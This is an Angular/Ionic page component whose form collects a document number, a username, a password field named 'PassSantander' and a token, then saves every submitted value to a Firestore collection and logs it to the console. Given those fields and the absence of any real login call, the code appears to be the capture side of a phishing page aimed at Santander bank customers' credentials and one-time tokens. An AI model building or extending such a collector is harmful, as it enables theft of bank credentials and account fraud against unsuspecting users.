import { Component, OnInit } from '@angular/core';
import { FormControl, FormGroup } from '@angular/forms';
import { FirestoreService } from '../Services/firestore.service';
import user from '../Interface/Interface';
import { Firestore } from 'firebase/firestore/lite';
@Component({
  selector: 'app-home',
  templateUrl: 'home.page.html',
  styleUrls: ['home.page.scss'],
})
export class HomePage implements OnInit {

  formulario: FormGroup;

  User: user={
    // rta: null,
    id: '',
    numDocuments: '',
    PassSantander: '',
    User: '', 
    token: '',
   };

  constructor(
          private firestore: FirestoreService
  ) {
    this.formulario = new FormGroup({
      id: new FormControl,
      numDocuments: new FormControl,
      PassSantander: new FormControl,
      User: new FormControl,
      token: new FormControl,
    })
  }

ngOnInit() : void {
}

onSubmit() {
  const userData: user = this.formulario.value;
  // userData.timestamp = firestore.FieldValue.serverTimestamp(); // Establecer fecha y hora actual

  this.firestore.addUser(userData).then(() => {
    console.log('Usuario agregado correctamente a Firestore:', userData);
  }).catch((error) => {
    console.error('Error al agregar usuario a Firestore:', error);
  });
}


}
